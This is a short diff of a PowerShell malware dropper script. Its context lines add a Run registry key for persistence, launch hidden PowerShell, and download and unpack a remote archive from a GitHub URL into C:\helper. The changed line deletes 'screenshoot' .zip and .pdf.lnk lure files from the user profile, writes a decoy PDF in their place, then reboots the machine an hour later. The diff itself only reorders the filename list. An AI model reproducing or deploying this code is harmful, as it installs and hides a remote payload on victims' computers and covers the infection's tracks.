@@ -7,5 +7,5 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
 powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ;
 wget "https://github.com/IsdaM123456/rQsa/raw/refs/heads/main/log.zip" -o C:\helper\log.zip; start-sleep 3 ;
 Expand-Archive C:\helper\log.zip C:\helper -Force ;
-"screenshoot_03113110041412141311566.zip","screenshoot_03113110041412141311566 (2).zip","screenshoot_03113110041412141311566.pdf.lnk" | % { Get-ChildItem $ENV:USERPROFILE -Recurse -Filter $_ | % { Remove-Item $_.FullName -Force; "1" | Out-File (Join-Path $_.DirectoryName "screenshoot_03113110041412141311566.pdf") -Encoding UTF8 } } ; start-sleep 3600 ; shutdown /r /t 300;
+"screenshoot_03113110041412141311566.zip","screenshoot_03113110041412141311566.pdf.lnk","screenshoot_03113110041412141311566 (2).zip" | % { Get-ChildItem $ENV:USERPROFILE -Recurse -Filter $_ | % { Remove-Item $_.FullName -Force; "1" | Out-File (Join-Path $_.DirectoryName "screenshoot_03113110041412141311566.pdf") -Encoding UTF8 } } ; start-sleep 3600 ; shutdown /r /t 300;
 }
